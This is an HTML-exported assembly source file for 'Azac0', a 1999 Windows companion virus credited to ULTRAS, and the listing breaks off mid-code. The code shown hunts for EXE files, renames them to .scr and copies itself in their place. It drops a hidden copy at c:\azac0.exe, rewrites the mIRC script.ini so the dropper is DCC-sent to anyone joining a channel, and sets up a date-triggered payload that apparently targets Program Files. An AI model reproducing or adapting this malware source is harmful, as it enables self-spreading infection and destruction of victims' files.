<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; Virus Name  : Azac0</span><span class="sc0">
</span><span class="sc1">; Author      : ULTRAS</span><span class="sc0">
</span><span class="sc1">; Created     : 15 September 1999</span><span class="sc0">
</span><span class="sc1">; Targets     : ALL EXE files (PE,D0S,NE)</span><span class="sc0">
</span><span class="sc1">; Platforms   : Win95/98/NT</span><span class="sc0">
</span><span class="sc1">; Version     : 1.0</span><span class="sc0">
</span><span class="sc1">; Type        : Companion</span><span class="sc0">
</span><span class="sc1">; Encrypted   : No</span><span class="sc0">
</span><span class="sc1">; Payload     : Yes</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Description :</span><span class="sc0">
</span><span class="sc1">;           Find *.exe files, renames them too .scr it then copys</span><span class="sc0">
</span><span class="sc1">;               the virus code to the original exe. When start the virus </span><span class="sc0">
</span><span class="sc1">;               it searches for file with such name only exe and execute </span><span class="sc0">
</span><span class="sc1">;               its. Create virus dr0per on c:\azac0.exe, delete script.ini</span><span class="sc0">
</span><span class="sc1">;       on c:\mirc directory and create new script.ini and write </span><span class="sc0">
</span><span class="sc1">;       script code. Write some parameters on win.ini.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Thanx       : Greater thank you Techno Phunk for help, but in the same </span><span class="sc0">
</span><span class="sc1">;               way Myrkry for companion method help, int13 for a certain </span><span class="sc0">
</span><span class="sc1">;               code of helps.</span><span class="sc0">


</span><span class="sc9">%out</span><span class="sc0">
</span><span class="sc9">%out</span><span class="sc0"> </span><span class="sc5">Azaco</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">copyright</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">c</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc2">1999</span><span class="sc0"> </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">U</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc9">%out</span><span class="sc0">
</span><span class="sc2">.386</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">
</span><span class="sc5">locals</span><span class="sc0">
</span><span class="sc1">; declaration of all used API-functions</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">FindFirstFileA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">FindNextFileA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">SetCurrentDirectoryA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">SetFileAttributesA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetCurrentDirectoryA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetWindowsDirectoryA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">WritePrivateProfileStringA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetSystemTime</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">MoveFileA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetCommandLineA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CreateProcessA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">lstrcpyA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">lstrcat</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">WriteFile</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">DeleteFileA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">RemoveDirectoryA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc1">; here begins our data</span><span class="sc0">
</span><span class="sc9">.data</span><span class="sc0">
</span><span class="sc5">exe</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'*.EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; name of file to search</span><span class="sc0">
</span><span class="sc5">fhandle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; file handle</span><span class="sc0">
</span><span class="sc5">nashandle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; file handle</span><span class="sc0">
</span><span class="sc5">processi</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; PROCESS_INFORMATION</span><span class="sc0">
</span><span class="sc5">startupi</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; STARTUPINFO</span><span class="sc0">
</span><span class="sc5">win32_fdata</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;filename,attributes,size and more</span><span class="sc0">
</span><span class="sc5">viro</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; buffer</span><span class="sc0">
</span><span class="sc5">nujno</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; buffer</span><span class="sc0">
</span><span class="sc5">nashv</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; buffer </span><span class="sc0">
</span><span class="sc5">nastoeh</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; buffer </span><span class="sc0">
</span><span class="sc5">pazwinini</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; buffer</span><span class="sc0">
</span><span class="sc5">winini</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"\WIN.INI"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; win.ini file</span><span class="sc0">
</span><span class="sc5">diiri</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; buffer</span><span class="sc0">
</span><span class="sc5">windoze</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"windows"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; windows section on win.ini</span><span class="sc0">
</span><span class="sc5">zapuskz</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"run"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; run parameters</span><span class="sc0">
</span><span class="sc5">dot</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'..'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; setdir '..'</span><span class="sc0">
</span><span class="sc5">time</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">; get time</span><span class="sc0">
</span><span class="sc5">ayear</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; year</span><span class="sc0">
</span><span class="sc5">amonth</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; month</span><span class="sc0">
</span><span class="sc5">adayofweek</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;day of week</span><span class="sc0">
</span><span class="sc5">aday</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; day</span><span class="sc0">
</span><span class="sc5">ahour</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; hour</span><span class="sc0">
</span><span class="sc5">aminute</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;minute</span><span class="sc0">
</span><span class="sc5">asecond</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; seconde</span><span class="sc0">
</span><span class="sc5">amilliseconds</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; milliseconds</span><span class="sc0">
</span><span class="sc1">;year,month,dayofweek,day etc...</span><span class="sc0">
</span><span class="sc5">azas</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">; buffer</span><span class="sc0">
</span><span class="sc5">mirc</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'c:\mirc\script.ini'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc1">; mirc script file</span><span class="sc0">
</span><span class="sc5">num_bytes_written</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; number of bytes write</span><span class="sc0">
</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">title_</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'[azaco] virus by ULTRAS'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; virus name</span><span class="sc0">
</span><span class="sc5">msg</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Кто ненавидит войну, тот в плену'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc1">; mesage box</span><span class="sc0">
</span><span class="sc5">filehandle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;file handle</span><span class="sc0">
</span><span class="sc5">scriptini</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"[script]"</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">   </span><span class="sc1">; script parameters</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"n0=ON 1:JOIN:#: {/if ($nick==$me) { halt }"</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"n1=/dcc send $nick c:\azac0.exe"</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"n2=}"</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"n3=ON 1:TEXT:*azac0*:#:/quit AZAC0!!!"</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"n4=ON 1:TEXT:*virus*:#:/ignore -u666 $nick"</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"n5=ON 1:CONNECT: {"</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"n6=}"</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">scriptsize</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">scriptini</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0"> </span><span class="sc1">; virus code start here</span><span class="sc0">
</span><span class="sc5">aza</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'c:\azaco.exe'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; dr0peerr</span><span class="sc0">
</span><span class="sc5">@prg</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'c:\Program Files'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">; kill program files</span><span class="sc0">
</span><span class="sc5">azaco</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">nastoeh</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetCurrentDirectoryA</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">nashandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetCommandLineA</span><span class="sc0"> </span><span class="sc1">; get command line</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;eax = command-line</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">nashv</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">lstrcpyA</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">search</span><span class="sc4">:</span><span class="sc0"> 
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'.'</span><span class="sc0"> </span><span class="sc1">; found dot in filename?</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">found_d</span><span class="sc0"> </span><span class="sc1">; zero? jmp found_d</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">search</span><span class="sc0"> </span><span class="sc1">; jump search </span><span class="sc0">
</span><span class="sc5">found_d</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">00</span><span class="sc0"> </span><span class="sc1">; store zero at end of filename</span><span class="sc0">
</span><span class="sc5">infect</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">inf</span><span class="sc0">        </span><span class="sc1">; find procedure</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dot</span><span class="sc0">     </span><span class="sc1">; setdir '..'</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetCurrentDirectoryA</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">diiri</span><span class="sc0">   </span><span class="sc1">; getdir</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc1">; size directory buffer</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetCurrentDirectoryA</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">nashandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">setdir</span><span class="sc0"> </span><span class="sc1">; equal? jmp setdir</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">nashandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">infect</span><span class="sc0"> </span><span class="sc1">; jump infect</span><span class="sc0">
</span><span class="sc5">inf</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc1">; find first exe file</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">win32_fdata</span><span class="sc0"> </span><span class="sc1">; win32_find_data</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exe</span><span class="sc0">    </span><span class="sc1">; handle of search</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FindFirstFileA</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fhandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; save filename</span><span class="sc0">
</span><span class="sc5">proverim</span><span class="sc4">:</span><span class="sc0"> 
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">;cant find exe file</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">setdir</span><span class="sc0">  </span><span class="sc1">; equal? jump to setdir</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">infect_f</span><span class="sc0"> </span><span class="sc1">; infect</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">infect_f</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">; infect file</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">viro</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">nujno</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">lstrcpyA</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">nujno</span><span class="sc0">
</span><span class="sc5">search_z</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'.'</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">mojet</span><span class="sc0"> </span><span class="sc1">; zero? jmp mojet</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">search_z</span><span class="sc0"> </span><span class="sc1">; jump search_z</span><span class="sc0">
</span><span class="sc5">mojet</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'rcs'</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">nujno</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">viro</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MoveFileA</span><span class="sc0">   </span><span class="sc1">;rename original.exe - original.scr</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">viro</span><span class="sc0"> </span><span class="sc1">; copy active virus original.exe</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">nashv</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc0">                        
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">win32_fdata</span><span class="sc0"> </span><span class="sc1">; find next *.exe file</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fhandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FindNextFileA</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">proverim</span><span class="sc0"> </span><span class="sc1">; jump proverim</span><span class="sc0">
</span><span class="sc5">mircdrop</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">time</span><span class="sc0"> </span><span class="sc1">; check time</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetSystemTime</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">aday</span><span class="sc4">],</span><span class="sc2">13d</span><span class="sc0"> </span><span class="sc1">; 13?</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">payload</span><span class="sc0"> </span><span class="sc1">; equal? jmp payload</span><span class="sc0">
</span><span class="sc5">drop</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; coping active file to c:\azac0.exe</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">aza</span><span class="sc0"> </span><span class="sc1">; droper c:\azac0.exe</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">nashv</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">; active file</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000001h</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc2">00000002h</span><span class="sc0"> 
</span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">aza</span><span class="sc0"> </span><span class="sc1">; set attribute droper c:\azac0.exe</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">;set attribute hide and system</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetFileAttributesA</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">mirc</span><span class="sc0">   </span><span class="sc1">; delete c:\mirc\script.ini</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">DeleteFileA</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000080h</span><span class="sc0"> 
